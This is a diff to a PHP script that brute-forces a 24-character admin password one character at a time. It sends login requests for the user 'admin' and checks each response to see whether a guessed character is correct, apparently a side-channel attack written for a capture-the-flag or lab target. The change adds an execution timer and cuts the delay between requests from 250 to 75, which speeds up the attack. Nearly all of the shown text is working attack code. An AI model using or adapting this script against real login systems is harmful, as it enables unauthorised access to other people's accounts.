@@ -7,6 +7,8 @@ $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 $correct_pwd = "";
 $placeholder_pwd = "........................";
 
+$start = time();
+
 while (strlen($correct_pwd) < 24)
 {
     for ($i = 0;$i < strlen($characters); $i++)
@@ -19,7 +21,7 @@ while (strlen($correct_pwd) < 24)
                 'login' => 'admin',
                 'password' => $placeholder_pwd
             ],
-            'delay' => 250
+            'delay' => 75
         ]);
         $body = $response->getBody();
 
@@ -35,6 +37,8 @@ while (strlen($correct_pwd) < 24)
         }
     }
 }
+
+echo "Executed in: " . (time() - $start) . "s";
 
 function check_character_is_correct($response)
 {
